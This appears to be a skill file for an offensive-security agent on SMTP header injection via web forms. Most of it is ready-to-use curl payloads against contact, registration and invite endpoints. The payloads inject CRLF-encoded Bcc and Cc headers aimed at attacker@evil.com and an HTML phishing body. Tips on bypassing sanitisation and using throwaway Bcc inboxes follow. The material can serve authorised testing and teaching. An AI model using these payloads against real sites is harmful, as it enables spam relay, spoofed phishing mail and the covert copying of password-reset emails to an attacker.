---
name: email-header-injection
description: SMTP header injection via web forms enabling email spoofing, Bcc injection, and arbitrary email sending through contact and registration forms
---

# Email Header Injection

Email header injection occurs when user input is included in email headers (To, From, Subject, Cc, Bcc) without sanitization. Attackers inject CRLF characters to add headers, enabling spam relay, Bcc-based data exfiltration, and email spoofing.

## Key Vulnerabilities

### Header Injection via Contact Forms

```bash
# Inject Bcc header via email field
curl -sk https://TARGET/contact -X POST \
  -d "name=Test&email=user@test.com%0aBcc:attacker@evil.com&subject=Hello&message=Test"

# Inject Cc header
curl -sk https://TARGET/contact -X POST \
  -d "name=Test&email=user@test.com%0d%0aCc:attacker@evil.com&subject=Test&message=Test"

# Inject via subject field
curl -sk https://TARGET/contact -X POST \
  -d "name=Test&email=user@test.com&subject=Test%0d%0aBcc:attacker@evil.com&message=Test"

# Full header injection — add custom body
curl -sk https://TARGET/contact -X POST \
  -d "name=Test&email=user@test.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Phishing</h1>&subject=Test"
```

### Injection via Registration/Invite

```bash
# Inject via registration email field
curl -sk https://TARGET/register -X POST \
  -d "username=test&email=victim@target.com%0aBcc:attacker@evil.com&password=test123"

# Inject via invite/referral
curl -sk https://TARGET/api/invite -X POST -H "Content-Type: application/json" \
  -d '{"email":"friend@test.com\r\nBcc:attacker@evil.com"}'
```

## Testing Methodology

1. **Identify email-sending features** — contact forms, registration, password reset, invite, newsletter
2. **Test CRLF in all fields** — email, name, subject with `%0d%0a` or `%0a`
3. **Add Bcc/Cc headers** — verify by checking if attacker email receives copy
4. **Test body injection** — double CRLF to start custom email body

## Impact

- **Medium**: Spam relay — use target's mail server to send arbitrary emails
- **Medium**: Phishing — send emails appearing from target's domain
- **Low**: Data exfiltration via Bcc on password reset emails

## Pro Tips

1. Test `%0a` (LF only) in addition to `%0d%0a` — many mail libraries accept bare LF
2. PHP `mail()` function is the most commonly vulnerable — it passes raw headers
3. Modern frameworks (Django, Rails) typically sanitize email headers — but custom implementations don't
4. Verify by using a temporary email (guerrillamail, mailinator) as the Bcc target
